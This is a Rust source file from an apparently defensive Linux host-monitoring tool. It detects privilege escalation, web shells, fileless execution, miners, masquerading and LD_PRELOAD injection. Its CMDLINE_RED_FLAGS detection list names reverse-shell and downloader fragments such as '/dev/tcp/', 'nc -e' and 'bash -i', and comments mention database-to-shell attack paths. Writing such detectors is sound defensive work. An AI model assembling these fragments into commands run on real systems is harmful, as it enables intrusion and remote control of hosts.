//! Process security analysis.
//!
//! Real-time (netlink proc connector):
//! * **privilege escalation** — a root process whose non-root parent is not
//!   a known privilege broker (catches kernel exploits that patch creds and
//!   exec a shell), `setuid(0)` by programs that never had root;
//! * **unknown SUID** — euid 0 for a non-root user via an executable not in
//!   the setuid allowlist;
//! * **web shells in action** — a web worker spawning shells/network tools;
//! * **fileless / masquerading / miners / exec from writable dirs**;
//! * **ptrace** injection by non-debuggers;
//! * **lineage anomalies** — parent→child pairs never seen during learning.
//!
//! Periodic (`/proc` scan): reverse shells (shell with TCP socket on stdio),
//! miners (CPU + pool ports), CPU hogs, zombies, long D-state, fd exhaustion.

use crate::heuristics::Lineage;
use crate::runtime::{Cx, Detector, SensorState, Shared, Sink, lock};
use crate::util::exe_basename;
use std::collections::{HashMap, HashSet};
use std::sync::Arc;
use std::time::{Duration, Instant};
use warden_core::condition::{Conditions, Policy, Report};
use warden_core::config::ProcessConfig;
use warden_core::ratelimit::Cooldown;
use warden_core::units::truncate;
use warden_core::{ActionSpec, Event, GlobList, ProcessRef, Severity, Subject};
use warden_sys::process::{self, ProcInfo};
use warden_sys::{net, proc_connector};

const SHELLS: &[&str] = &["sh", "bash", "dash", "zsh", "ksh", "ash", "csh", "tcsh", "fish", "busybox", "mksh"];
const INTERPRETERS: &[&str] = &["python*", "perl*", "ruby*", "php*", "node", "nodejs", "lua*", "tclsh*", "awk", "gawk"];
const KTHREAD_LIKE: &[&str] = &[
    "kworker*",
    "ksoftirqd*",
    "kthreadd",
    "migration/*",
    "rcu_*",
    "kswapd*",
    "watchdog/*",
    "watchdogd",
    "irq/*",
    "jbd2/*",
    "kcompactd*",
    "khugepaged",
    "kblockd",
    "kauditd",
    "kdevtmpfs",
    "oom_reaper",
    "cpuhp/*",
    "idle_inject/*",
];
/// Container runtimes that re-execute themselves from a sealed `memfd`
/// (the CVE-2019-5736 mitigation): the names of their images and of the
/// system binaries that start them.
const MEMFD_RUNTIMES: &[&str] = &["runc", "crun", "libcontainer", "containerd", "dockerd", "youki", "conmon"];
const CMDLINE_RED_FLAGS: &[&str] = &[
    "/dev/tcp/",
    "/dev/udp/",
    "nc -e",
    "ncat -e",
    "nc -c",
    "| sh",
    "|sh",
    "| bash",
    "|bash",
    "base64 -d",
    "base64 --decode",
    "chmod +x",
    "chmod 777",
    "wget http",
    "curl http",
    "curl -s http",
    "python -c",
    "python3 -c",
    "perl -e",
    "mkfifo",
    "socat exec",
    "/tmp/",
    "/dev/shm/",
    "xmrig",
    "stratum+tcp",
    "crontab -",
    "bash -i",
    "sh -i",
];

/// Compiled process rules.
pub struct ProcRules {
    pub cfg: ProcessConfig,
    web_users: HashSet<String>,
    web_comms: GlobList,
    db_comms: GlobList,
    suspicious: GlobList,
    allowed: Vec<(GlobList, GlobList)>,
    writable: GlobList,
    setuid_allow: GlobList,
    root_parents: GlobList,
    ptrace_allow: GlobList,
    miners: GlobList,
    shells: GlobList,
    interpreters: GlobList,
    kthread_like: GlobList,
    /// Does this process run a system binary of the host?
    /// ([`warden_sys::process::is_system_binary`]; a stub in tests.)
    pub system_binary: fn(i32, &str) -> bool,
    /// Did Warden start this process (a hook, a notification or health
    /// command, or what they ran)? ([`warden_sys::process::is_own_descendant`].)
    pub own_descendant: fn(i32) -> bool,
}

impl ProcRules {
    pub fn new(cfg: &ProcessConfig) -> Self {
        Self {
            system_binary: warden_sys::process::is_system_binary,
            own_descendant: warden_sys::process::is_own_descendant,
            web_users: cfg.web_users.iter().cloned().collect(),
            web_comms: GlobList::new(&cfg.web_comms),
            db_comms: GlobList::new(&cfg.db_comms),
            suspicious: GlobList::new(&cfg.suspicious_children),
            allowed: cfg
                .allowed_children
                .iter()
                .map(|a| {
                    (GlobList::new(std::slice::from_ref(&a.parent)), GlobList::new(std::slice::from_ref(&a.child)))
                })
                .collect(),
            writable: GlobList::new(&cfg.writable_exec_paths),
            setuid_allow: GlobList::new(&cfg.setuid_allowlist),
            root_parents: GlobList::new(&cfg.root_transition_parents),
            ptrace_allow: GlobList::new(&cfg.ptrace_allow),
            miners: GlobList::new(&cfg.miner_names),
            shells: GlobList::new(SHELLS),
            interpreters: GlobList::new(INTERPRETERS),
            kthread_like: GlobList::new(KTHREAD_LIKE),
            cfg: cfg.clone(),
        }
    }

    pub fn is_shell(&self, comm: &str) -> bool {
        self.shells.is_match(comm)
    }

    fn child_allowed(&self, parent_comm: &str, comm: &str, exe: Option<&str>, cmdline: &str) -> bool {
        let shell_target = self.shell_c_target(comm, cmdline);
        let script = self.script_target(comm, cmdline);
        self.allowed.iter().any(|(p, c)| {
            p.is_match(parent_comm)
                && (c.is_match(comm)
                    || exe.is_some_and(|e| c.is_match(e.trim_end_matches(" (deleted)")))
                    || shell_target.as_deref().is_some_and(|t| c.is_match(t) || c.is_match(exe_basename(t)))
                    || script.as_deref().is_some_and(|t| c.is_match(t)))
        })
    }

    /// For `perl /usr/lib/cgi-bin/x.pl` / `python3 app.py` return the script
    /// path, so CGI scripts can be allow-listed by location.
    fn script_target(&self, comm: &str, cmdline: &str) -> Option<String> {
        if !(self.interpreters.is_match(comm) || self.is_shell(comm)) {
            return None;
        }
        let mut args = cmdline.split_whitespace().skip(1);
        let first = args.find(|a| !a.starts_with('-'))?;
        if cmdline.contains(" -c ") || cmdline.contains(" -e ") || cmdline.contains(" -r ") {
            return None; // inline code, not a script file
        }
        first.contains('/').then(|| first.to_owned())
    }

    /// For `sh -c "cmd args"` return `cmd` (to honour allowlists through
    /// the shell indirection PHP's `exec()`/`system()` always adds).
    fn shell_c_target(&self, comm: &str, cmdline: &str) -> Option<String> {
        if !self.is_shell(comm) {
            return None;
        }
        let rest = cmdline.split_once(" -c ")?.1.trim_start_matches(['\'', '"']);
        let first = rest.split_whitespace().next()?;
        // A compound command (pipes, separators) is never "just the allowed tool".
        if rest.contains(['|', ';', '&', '`', '$', '>', '<']) {
            return None;
        }
        Some(first.to_owned())
    }

    /// Is the parent a process that executes web requests? Web accounts
    /// always count; web-server/app-server names count for *workers* only —
    /// masters run as root and legitimately spawn helpers (piped loggers,
    /// config tests), while request code runs in unprivileged workers
    /// (www-data, a per-site user under suEXEC/mpm-itk/FPM pools…).
    ///
    /// Not in an interactive login session: `sudo -u www-data wp plugin
    /// update` (or `composer`, `artisan`) from SSH runs as a web account
    /// in the administrator's `session-N.scope`, and is administration,
    /// not a web worker. Code reached through the web server — a
    /// webshell — lives in the server's or FPM's service cgroup and cannot
    /// leave it; cron jobs of a web account (`system.slice/cron.service`)
    /// still count. (The 0.14.1 lab logged 85 `web_spawn` warnings from
    /// test commands run as `nobody` in an SSH session.)
    pub fn is_web_parent(&self, p: &Observed) -> bool {
        (self.web_users.contains(&p.parent_user) && !p.cgroup.as_deref().is_some_and(in_login_session))
            || (self.web_comms.is_match(&p.parent_comm)
                && p.parent_euid != 0
                && p.parent_cgroup.as_deref().is_some_and(|c| c.starts_with("/system.slice/") || c.contains(".slice/")))
    }

    pub fn is_db_parent(&self, p: &Observed) -> bool {
        self.db_comms.is_match(&p.parent_comm)
    }

    pub fn is_web_user(&self, user: &str) -> bool {
        self.web_users.contains(user)
    }

    /// The absolute script path a shell/interpreter was started with
    /// (`bash /tmp/x.sh`, `python3 /var/www/up/a.py`).
    fn script_arg<'c>(&self, comm: &str, cmdline: &'c str) -> Option<&'c str> {
        if !(self.interpreters.is_match(comm) || self.is_shell(comm)) {
            return None;
        }
        cmdline.split_whitespace().skip(1).find(|a| !a.starts_with('-')).filter(|a| a.starts_with('/'))
    }

    /// A shell/interpreter running a script from a writable location.
    pub fn script_from_writable(&self, comm: &str, cmdline: &str) -> bool {
        self.script_arg(comm, cmdline).is_some_and(|s| self.writable.is_match(s))
    }
}

/// Everything known about a process at the time of analysis.
/// Is a cgroup path an interactive login session
/// (`/user.slice/user-1000.slice/session-5.scope`)?
pub fn in_login_session(cgroup: &str) -> bool {
    cgroup.starts_with("/user.slice/")
        && cgroup.rsplit('/').next().is_some_and(|l| l.starts_with("session-") && l.ends_with(".scope"))
}

#[derive(Debug, Clone, Default)]
pub struct Observed {
    pub info: ProcInfo,
    pub exe: Option<String>,
    pub cmdline: String,
    pub user: String,
    pub cgroup: Option<String>,
    pub parent_pid: i32,
    pub parent_comm: String,
    pub parent_exe: Option<String>,
    pub parent_ruid: u32,
    pub parent_euid: u32,
    pub parent_user: String,
    pub parent_cgroup: Option<String>,
}

impl Observed {
    pub fn read(pid: i32, users: &dyn Fn(u32) -> String) -> Option<Self> {
        Self::read_with(pid, users, |_| true)
    }

    /// Read a process. The parent's executable and cgroup (two more `/proc`
    /// reads) are loaded only when `want_parent_details` says a rule could
    /// need them — this runs for every `exec` on the host.
    pub fn read_with(
        pid: i32,
        users: &dyn Fn(u32) -> String,
        want_parent_details: impl Fn(&Observed) -> bool,
    ) -> Option<Self> {
        let info = process::read_info(pid).ok()?;
        let parent = process::read_status(info.ppid).ok();
        let mut o = Self {
            exe: process::exe(pid),
            cmdline: process::cmdline(pid, 2048).unwrap_or_default(),
            user: users(info.ruid),
            cgroup: process::cgroup(pid),
            parent_pid: info.ppid,
            parent_comm: parent.as_ref().map(|p| p.name.clone()).unwrap_or_default(),
            parent_exe: None,
            parent_ruid: parent.as_ref().map(|p| p.uid[0]).unwrap_or(0),
            parent_euid: parent.as_ref().map(|p| p.uid[1]).unwrap_or(0),
            parent_user: parent.as_ref().map(|p| users(p.uid[0])).unwrap_or_default(),
            parent_cgroup: None,
            info,
        };
        if want_parent_details(&o) {
            o.parent_exe = process::exe(o.parent_pid);
            o.parent_cgroup = process::cgroup(o.parent_pid);
        }
        Some(o)
    }

    pub fn to_ref(&self) -> ProcessRef {
        ProcessRef {
            pid: self.info.pid,
            start_time: self.info.start_time,
            comm: self.info.comm.clone(),
            exe: self.exe.clone(),
            cmdline: Some(self.cmdline.clone()),
            uid: Some(self.info.ruid),
            user: Some(self.user.clone()),
            ppid: Some(self.parent_pid),
            container: self.cgroup.as_deref().and_then(warden_sys::cgroup::container_of),
            cgroup: self.cgroup.clone(),
        }
    }
}

/// A point-in-time finding about a process (an exec, a ptrace): reported,
/// then not again for the same process within the cooldown.
fn finding(
    alerted: &mut Cooldown<String>,
    kind: &str,
    sev: Severity,
    title: String,
    o: &Observed,
    actions: Vec<ActionSpec>,
) -> Option<Event> {
    let fp = format!("{kind}:{}:{}", o.info.pid, o.info.start_time);
    // a cooldown a person reads: real time (see `warden_sys::clock`)
    if !alerted.ready(&fp, warden_sys::clock::now()) {
        return None;
    }
    Some(finding_event(kind, sev, title, o, actions).fingerprint(fp))
}

/// The event of a finding about process `o`.
fn finding_event(kind: &str, sev: Severity, title: String, o: &Observed, actions: Vec<ActionSpec>) -> Event {
    {
        Event::new(kind, sev, title)
            .subject(Subject::Process(o.to_ref()))
            .detail("exe", o.exe.clone().unwrap_or_default())
            .detail("cmdline", o.cmdline.clone())
            .detail("user", o.user.clone())
            .detail("euid", o.info.euid)
            .detail("parent", format!("{}[{}] user={}", o.parent_comm, o.parent_pid, o.parent_user))
            .detail("parent_exe", o.parent_exe.clone().unwrap_or_default())
            .detail("cgroup", o.cgroup.clone().unwrap_or_default())
            .actions(actions)
    }
}

/// Where a process's executable lives, for the fileless check.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ExeKind {
    /// `memfd_create` + `fexecve`: never existed on disk.
    Memfd,
    /// Deleted from a writable/temporary location — a dropper that removed itself.
    DeletedFromWritable,
    /// Deleted, but a file with that name exists again: replaced by an
    /// upgrade (dpkg writes a new inode and renames it over the old one).
    Replaced,
    /// Deleted from a system location and not replaced.
    Removed,
}

const WRITABLE_PREFIXES: &[&str] =
    &["/tmp/", "/var/tmp/", "/dev/shm/", "/run/user/", "/home/", "/root/", "/var/www/", "/srv/", "/var/lib/php/"];

/// `None` for an ordinary on-disk executable.
pub fn classify_exe(exe: &str) -> Option<ExeKind> {
    if exe.starts_with("/memfd:") {
        return Some(ExeKind::Memfd);
    }
    let path = exe.strip_suffix(" (deleted)")?;
    if WRITABLE_PREFIXES.iter().any(|p| path.starts_with(p)) || !path.starts_with('/') {
        return Some(ExeKind::DeletedFromWritable);
    }
    let replaced = std::fs::symlink_metadata(path).is_ok_and(|m| {
        use std::os::unix::fs::MetadataExt;
        m.is_file() && m.uid() == 0 && m.mode() & 0o022 == 0
    });
    Some(if replaced { ExeKind::Replaced } else { ExeKind::Removed })
}

/// Is a `memfd` image the container runtime re-executing itself?
///
/// The image name is chosen by the process (`memfd_create("runc")` is open to
/// anyone), so it only selects candidates. What decides is the parent, which
/// the kernel vouches for: it must run a runtime binary that is a trusted
/// system program (`containerd-shim`, `runc`, `conmon` …), or be the same
/// kind of runtime image itself (the `runc init` children of a re-executed
/// `runc`) under the same UID. A web shell's `memfd:runc` has `php-fpm` or a
/// shell as its parent and is reported.
fn runtime_memfd(o: &Observed, trusted_binary: impl Fn(i32, &str) -> bool) -> bool {
    let name_of = |image: &str| image.strip_prefix("/memfd:").map(str::to_owned);
    let is_runtime = |n: &str| MEMFD_RUNTIMES.iter().any(|r| n.starts_with(r));
    let Some(image) = o.exe.as_deref().and_then(name_of) else { return false };
    if !is_runtime(&image) {
        return false;
    }
    let Some(parent) = o.parent_exe.as_deref() else { return false };
    match name_of(parent) {
        Some(parent_image) => is_runtime(&parent_image) && o.info.ruid == o.parent_ruid,
        None => is_runtime(exe_basename(parent.trim_end_matches(" (deleted)"))) && trusted_binary(o.parent_pid, parent),
    }
}

/// A real program whose name merely resembles a kernel thread
/// (`/usr/sbin/watchdog`): its comm is the basename of a root-owned binary
/// in a system directory. Masquerading malware renames itself after a
/// kernel thread while its binary is called something else or lives in a
/// writable place.
fn genuine_program(system_binary: fn(i32, &str) -> bool, pid: i32, comm: &str, exe: &str) -> bool {
    !comm.starts_with('[')
        && !exe.is_empty()
        && warden_sys::process::comm_matches_exe(comm, exe.trim_end_matches(" (deleted)"))
        && system_binary(pid, exe)
}

fn red_flags(cmdline: &str) -> Vec<&'static str> {
    CMDLINE_RED_FLAGS.iter().copied().filter(|f| cmdline.contains(f)).collect()
}

/// Shared analysis logic for exec events and periodic scans.
pub struct ProcessAnalyzer {
    pub rules: ProcRules,
    creds: HashMap<i32, (u64, u32, u32, u32)>,
    alerted: Cooldown<String>,
}

impl ProcessAnalyzer {
    pub fn new(cfg: &ProcessConfig) -> Self {
        Self { rules: ProcRules::new(cfg), creds: HashMap::new(), alerted: Cooldown::new(Duration::from_secs(600)) }
    }

    fn finding(
        &mut self,
        kind: &str,
        sev: Severity,
        title: String,
        o: &Observed,
        actions: Vec<ActionSpec>,
    ) -> Option<Event> {
        finding(&mut self.alerted, kind, sev, title, o, actions)
    }

    /// Could any rule need the parent's executable or cgroup for this
    /// process? (Privilege-escalation candidates, web/database spawns,
    /// execution from writable locations.)
    pub fn needs_parent_details(&self, o: &Observed) -> bool {
        let r = &self.rules;
        let comm = o.info.comm.as_str();
        let exe = o.exe.as_deref().unwrap_or("");
        let base = exe_basename(exe);
        let clean = exe.trim_end_matches(" (deleted)");
        (o.info.ruid == 0 && o.parent_pid > 1 && (o.parent_ruid != 0 || o.parent_euid != 0))
            || r.suspicious.is_match(comm)
            || (!base.is_empty() && r.suspicious.is_match(base))
            || (!clean.is_empty() && r.writable.is_match(clean))
            || exe.starts_with("/memfd:")
            || o.cmdline.split_whitespace().skip(1).any(|a| a.starts_with('/') && r.writable.is_match(a))
    }

    /// Analyze a freshly exec'ed (or newly discovered) process.
    ///
    /// Runs for every exec on the host, so it borrows the compiled rules
    /// instead of cloning the configuration, and only allocates when a
    /// finding is produced.
    pub fn on_exec(&mut self, o: &Observed, lineage: Option<&mut Lineage>) -> Vec<Event> {
        let mut out = Vec::new();
        let Self { rules: r, creds, alerted } = self;
        let c = &r.cfg;
        let comm = o.info.comm.as_str();
        let exe = o.exe.as_deref().unwrap_or("");
        let base = exe_basename(exe);
        creds.insert(o.info.pid, (o.info.start_time, o.info.ruid, o.info.euid, o.info.suid));
        if creds.len() > 200_000 {
            creds.clear();
        }
        let clean_exe = exe.trim_end_matches(" (deleted)");

        // 1. fileless execution
        if c.detect_fileless
            && let Some(kind) = classify_exe(exe)
        {
            match kind {
                ExeKind::Memfd if runtime_memfd(o, r.system_binary) => {}
                ExeKind::Memfd | ExeKind::DeletedFromWritable => out.extend(finding(
                    alerted,
                    "security.fileless_exec",
                    Severity::Critical,
                    format!("fileless execution: {comm}[{}] runs from {exe}", o.info.pid),
                    o,
                    c.response.fileless.clone(),
                )),
                // The package manager replaced the binary under a running
                // service: not an attack, but the service runs old code.
                ExeKind::Replaced => out.extend(
                    finding(
                        alerted,
                        "process.stale_binary",
                        Severity::Notice,
                        format!(
                            "{comm}[{}] still runs the previous version of {clean_exe} (replaced on disk, e.g. by a package upgrade)",
                            o.info.pid
                        ),
                        o,
                        Vec::new(),
                    )
                    .map(|e| {
                        let unit = o.cgroup.as_deref().and_then(warden_sys::cgroup::unit_of);
                        let hint = match &unit {
                            Some(u) => format!("restart it to load the new version: systemctl restart {u}"),
                            None => "restart the process to load the new version".into(),
                        };
                        e.detail("hint", hint).detail("unit", unit)
                    }),
                ),
                ExeKind::Removed => out.extend(finding(
                    alerted,
                    "process.deleted_binary",
                    Severity::Warning,
                    format!("{comm}[{}] runs {clean_exe}, which no longer exists on disk", o.info.pid),
                    o,
                    Vec::new(),
                )),
            }
        }
        // 2. known miner
        if r.miners.is_match(comm) || (!base.is_empty() && r.miners.is_match(base)) {
            out.extend(finding(
                alerted,
                "security.miner",
                Severity::Critical,
                format!("crypto-miner started: {comm}[{}] ({exe})", o.info.pid),
                o,
                c.response.miner.clone(),
            ));
        }
        // 3. masquerading as a kernel thread
        let argv0 = o.cmdline.split_whitespace().next().unwrap_or("");
        if c.detect_masquerade
            && !exe.is_empty()
            && (r.kthread_like.is_match(comm)
                || comm.starts_with('[')
                || (argv0.starts_with('[') && argv0.ends_with(']')))
            && !genuine_program(r.system_binary, o.info.pid, comm, exe)
        {
            out.extend(finding(
                alerted,
                "security.masquerade",
                Severity::Critical,
                format!("userspace process {comm}[{}] disguised as a kernel thread (exe {exe})", o.info.pid),
                o,
                c.response.masquerade.clone(),
            ));
        }
        // 4. setuid-root exec of a non-allowlisted binary
        if o.info.ruid != 0 && o.info.euid == 0 && !exe.is_empty() && !r.setuid_allow.is_match(clean_exe) {
            out.extend(finding(
                alerted,
                "security.unknown_suid_exec",
                Severity::Critical,
                format!("{} gained euid 0 through non-allowlisted SUID binary {exe}", o.user),
                o,
                c.response.unknown_suid.clone(),
            ));
        }
        // 5. root child of a non-root parent (exploit → root shell)
        if o.info.ruid == 0
            && o.parent_pid > 1
            && o.parent_ruid != 0
            && o.parent_euid != 0
            && !r.root_parents.is_match(&o.parent_comm)
            && !r.setuid_allow.is_match(clean_exe)
            && !o.parent_exe.as_deref().is_some_and(|pe| r.setuid_allow.is_match(pe))
        {
            out.extend(finding(
                alerted,
                "security.privilege_escalation",
                Severity::Critical,
                format!(
                    "privilege escalation: {comm}[{}] runs as root but its parent {}[{}] belongs to {}",
                    o.info.pid, o.parent_comm, o.parent_pid, o.parent_user
                ),
                o,
                c.response.privilege_escalation.clone(),
            ));
        }
        // 6. web worker spawning shells / tools. A program Warden runs as
        // `command_user` is not a web worker even when that account is one
        // of `web_users` (`nobody`): without this, a notification command
        // (`sh -c "… | curl"`) alerted on its own children, and each alert
        // ran the command again — a loop, bounded only by the rate limit.
        let suspicious_child = r.suspicious.is_match(comm) || (!base.is_empty() && r.suspicious.is_match(base));
        if suspicious_child
            && r.is_web_parent(o)
            && !r.child_allowed(&o.parent_comm, comm, o.exe.as_deref(), &o.cmdline)
            && !(r.own_descendant)(o.parent_pid)
        {
            let flags = red_flags(&o.cmdline);
            let sev = if flags.is_empty() { Severity::Warning } else { Severity::Critical };
            let mut actions = c.response.web_spawn.clone();
            if !flags.is_empty() && actions.is_empty() {
                // Clear webshell behaviour (downloader / reverse shell one-liner).
                actions = vec![ActionSpec::Kill { tree: true, grace: Some(Duration::from_millis(500)) }];
            }
            out.extend(
                finding(
                    alerted,
                    "security.web_spawn",
                    sev,
                    format!(
                        "web worker {}[{}] ({}) spawned {comm}: {}",
                        o.parent_comm,
                        o.parent_pid,
                        o.parent_user,
                        truncate(&o.cmdline, 160)
                    ),
                    o,
                    actions,
                )
                .map(|e| e.detail("red_flags", flags.clone()).detail("parent_pid", o.parent_pid)),
            );
        }
        // 6b. database server spawning shells / tools (SQLi → RCE: MySQL UDF,
        // PostgreSQL COPY ... TO PROGRAM, Redis module abuse)
        if suspicious_child
            && r.is_db_parent(o)
            && !r.is_web_parent(o)
            && !r.child_allowed(&o.parent_comm, comm, o.exe.as_deref(), &o.cmdline)
            && !(r.own_descendant)(o.parent_pid)
        {
            let flags = red_flags(&o.cmdline);
            let sev = if flags.is_empty() { Severity::Warning } else { Severity::Critical };
            let mut actions = c.response.db_spawn.clone();
            if !flags.is_empty() && actions.is_empty() {
                actions = vec![ActionSpec::Kill { tree: true, grace: Some(Duration::from_millis(500)) }];
            }
            out.extend(
                finding(
                    alerted,
                    "security.db_spawn",
                    sev,
                    format!(
                        "database server {}[{}] ({}) spawned {comm}: {}",
                        o.parent_comm,
                        o.parent_pid,
                        o.parent_user,
                        truncate(&o.cmdline, 160)
                    ),
                    o,
                    actions,
                )
                .map(|e| {
                    e.detail("red_flags", flags.clone()).detail(
                        "hint",
                        "legitimate cases: PostgreSQL archive_command/restore_command — allow them with \
                         [[process.allowed_children]] parent = \"postgres\"",
                    )
                }),
            );
        }
        // 7. execution from world-writable / upload locations
        let script = r.script_arg(comm, &o.cmdline);
        let binary_hit = !clean_exe.is_empty() && r.writable.is_match(clean_exe) && !exe.starts_with("/memfd:");
        let script_hit = script.is_some_and(|s| r.writable.is_match(s));
        if binary_hit || script_hit {
            let web = r.is_web_user(&o.user) || r.is_web_parent(o);
            let sev = match (binary_hit, web) {
                (true, true) => Severity::Critical,
                (true, false) | (false, true) => Severity::Warning,
                (false, false) => Severity::Notice,
            };
            let what = if binary_hit { clean_exe } else { script.unwrap_or_default() };
            out.extend(finding(
                alerted,
                "security.exec_from_writable",
                sev,
                format!("{} executed {what} from a writable location", o.user),
                o,
                if sev >= Severity::Warning { c.response.exec_from_writable.clone() } else { Vec::new() },
            ));
        }
        // 8. LD_PRELOAD injection into privileged or web processes
        if c.detect_ld_preload
            && (o.info.ruid == 0 || o.info.euid == 0 || r.is_web_user(&o.user))
            && let Some(lp) = process::environ_var(o.info.pid, "LD_PRELOAD")
            && !lp.trim().is_empty()
        {
            let bad = lp.split([':', ' ']).filter(|p| !p.is_empty()).any(|p| {
                r.writable.is_match(p)
                    || std::fs::metadata(p).map(|m| std::os::unix::fs::MetadataExt::uid(&m) != 0).unwrap_or(true)
            });
            if bad {
                out.extend(finding(
                    alerted,
                    "security.ld_preload",
                    Severity::Warning,
                    format!("{comm}[{}] runs with suspicious LD_PRELOAD={lp}", o.info.pid),
                    o,
                    c.response.ld_preload.clone(),
                ));
            }
        }
        // 9. lineage learning (services and web accounts only — user desktops are too dynamic)
        let service = o.cgroup.as_deref().is_some_and(|c| c.starts_with("/system.slice/"));
        if let Some(l) = lineage
            && (service || r.is_web_user(&o.user))
            && !exe.is_empty()
        {
            let key = format!("{}:{}", o.parent_user, o.parent_comm);
            if l.observe(&key, clean_exe) {
                out.extend(finding(
                    alerted,
                    "security.new_lineage",
                    Severity::Notice,
                    format!("never-seen process lineage: {} → {}", o.parent_comm, exe),
                    o,
                    Vec::new(),
                ));
            }
        }
        out
    }

    /// `setuid()`-family call observed by the proc connector.
    pub fn on_uid(&mut self, o: &Observed, ruid: u32, euid: u32) -> Vec<Event> {
        let prev = self.creds.insert(o.info.pid, (o.info.start_time, ruid, euid, o.info.suid));
        if euid != 0 {
            return Vec::new();
        }
        // start time 0: recorded by the exec fast path, which does not read
        // `stat`; identity is then guaranteed by exit events instead.
        let had_root =
            prev.is_some_and(|(st, r, e, s)| (st == o.info.start_time || st == 0) && (r == 0 || e == 0 || s == 0));
        if had_root || prev.is_none() {
            // Unknown history (started before Warden): don't guess.
            return Vec::new();
        }
        let exe = o.exe.clone().unwrap_or_default();
        if self.rules.setuid_allow.is_match(exe.trim_end_matches(" (deleted)"))
            || self.rules.root_parents.is_match(&o.info.comm)
        {
            return Vec::new();
        }
        let a = self.rules.cfg.response.privilege_escalation.clone();
        self.finding(
            "security.privilege_escalation",
            Severity::Critical,
            format!("{}[{}] switched to euid 0 without ever holding root (exe {exe})", o.info.comm, o.info.pid),
            o,
            a,
        )
        .into_iter()
        .collect()
    }

    pub fn on_ptrace(&mut self, target: &Observed, tracer: &Observed) -> Vec<Event> {
        if !self.rules.cfg.detect_ptrace || self.rules.ptrace_allow.is_match(&tracer.info.comm) {
            return Vec::new();
        }
        if tracer.exe.as_deref().is_some_and(|e| self.rules.ptrace_allow.is_match(exe_basename(e))) {
            return Vec::new();
        }
        let cross = target.info.ruid != tracer.info.ruid || target.info.ruid == 0;
        let sev = if cross { Severity::Warning } else { Severity::Notice };
        let a = if cross { self.rules.cfg.response.ptrace.clone() } else { Vec::new() };
        self.finding(
            "security.ptrace",
            sev,
            format!(
                "{}[{}] ({}) attached ptrace to {}[{}] ({})",
                tracer.info.comm, tracer.info.pid, tracer.user, target.info.comm, target.info.pid, target.user
            ),
            tracer,
            a,
        )
        .map(|e| e.detail("target", format!("{}[{}]", target.info.comm, target.info.pid)))
        .into_iter()
        .collect()
    }

    pub fn on_exit(&mut self, pid: i32) {
        self.creds.remove(&pid);
    }

    /// Credentials seen at exec (the fast path, which skips [`Self::on_exec`]).
    pub fn note_creds(&mut self, pid: i32, start_time: u64, ruid: u32, euid: u32, suid: u32) {
        self.creds.insert(pid, (start_time, ruid, euid, suid));
        if self.creds.len() > 200_000 {
            self.creds.clear();
        }
    }

    /// Lost connector events: exits may have been missed, so entries that
    /// rely on exit tracking for their identity are no longer trustworthy.
    pub fn forget_unverified_creds(&mut self) {
        self.creds.retain(|_, c| c.0 != 0);
    }
}

// ---------------------------------------------------------------------------
// real-time sensor
// ---------------------------------------------------------------------------

/// Parent facts reused across the many children one parent spawns (make, a
/// shell loop, cron, php-fpm workers). An entry is dropped when the parent
/// exits, execs, renames itself or changes uid (connector events) and after
/// [`PARENT_TTL`] (cgroup moves have no event).
#[derive(Debug, Clone, Default)]
struct ParentInfo {
    comm: String,
    ruid: u32,
    euid: u32,
    user: String,
    /// Executable and cgroup, loaded only when a rule needs them.
    details: Option<(Option<String>, Option<String>)>,
    at: Option<Instant>,
}

const PARENT_TTL: Duration = Duration::from_secs(30);
const PARENT_CACHE_MAX: usize = 8192;
const FAST_KEYS_MAX: usize = 8192;
/// Clean full analyses before a combination takes the fast path.
const FAST_AFTER: u8 = 3;
/// Fast-path combinations are re-learnt after this long.
const FAST_TTL: Duration = Duration::from_secs(3600);
/// Fast-path execs of root processes whose environment is checked for
/// LD_PRELOAD: one in this many (the first one always).
const LD_PRELOAD_SAMPLE: u32 = 4;

/// What makes two execs equivalent for the analysis rules that do not look
/// at the command line.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
struct ExecKey {
    parent_comm: String,
    parent_ruid: u32,
    parent_euid: u32,
    comm: String,
    exe: String,
    uids: [u32; 3],
}

#[derive(Debug, Clone, Copy)]
struct FastState {
    clean: u8,
    hits: u32,
    since: Instant,
}

/// Counters of the exec pipeline (exported as metrics).
#[derive(Debug, Default, Clone, Copy, PartialEq, Eq)]
pub struct ExecStats {
    pub full: u64,
    pub fast: u64,
    pub rechecks: u64,
    pub parent_hits: u64,
    pub parent_misses: u64,
    /// Processes that exited before they could be read.
    pub vanished: u64,
}

/// Per-exec analysis for the real-time sensor: a parent cache and a fast
/// path for repeated benign (parent, executable, uids) combinations on top
/// of [`ProcessAnalyzer`].
///
/// Full analysis: `status`, `stat`, `exe`, `cmdline`, `cgroup` of the child
/// plus the parent (`status`, and `exe` + `cgroup` when a rule needs them),
/// `environ` for root/web processes. Fast path: `status` + `exe` of the
/// child, the parent from the cache, plus `cmdline` for shells/interpreters
/// (script from a writable directory) and, sampled, `environ` for root
/// (LD_PRELOAD).
pub struct ExecPipeline {
    pub an: ProcessAnalyzer,
    parents: HashMap<i32, ParentInfo>,
    fast: HashMap<ExecKey, FastState>,
    fast_path: bool,
    recheck_every: u32,
    pub stats: ExecStats,
}

impl ExecPipeline {
    pub fn new(cfg: &ProcessConfig) -> Self {
        Self {
            an: ProcessAnalyzer::new(cfg),
            parents: HashMap::new(),
            fast: HashMap::new(),
            fast_path: cfg.exec_fast_path,
            recheck_every: cfg.exec_recheck_every,
            stats: ExecStats::default(),
        }
    }

    fn parent(&mut self, ppid: i32, users: &dyn Fn(u32) -> String, now: Instant) -> ParentInfo {
        if let Some(p) = self.parents.get(&ppid)
            && p.at.is_some_and(|t| now.saturating_duration_since(t) < PARENT_TTL)
        {
            self.stats.parent_hits += 1;
            return p.clone();
        }
        self.stats.parent_misses += 1;
        let Ok(st) = process::read_status(ppid) else {
            // Gone already: the same defaults the analysis always used.
            return ParentInfo::default();
        };
        let p = ParentInfo {
            user: users(st.uid[0]),
            comm: st.name,
            ruid: st.uid[0],
            euid: st.uid[1],
            details: None,
            at: Some(now),
        };
        if self.parents.len() >= PARENT_CACHE_MAX {
            self.parents.retain(|_, p| p.at.is_some_and(|t| now.saturating_duration_since(t) < PARENT_TTL));
            if self.parents.len() >= PARENT_CACHE_MAX {
                self.parents.clear();
            }
        }
        self.parents.insert(ppid, p.clone());
        p
    }

    fn parent_details(&mut self, ppid: i32) -> (Option<String>, Option<String>) {
        if let Some(d) = self.parents.get(&ppid).and_then(|p| p.details.clone()) {
            return d;
        }
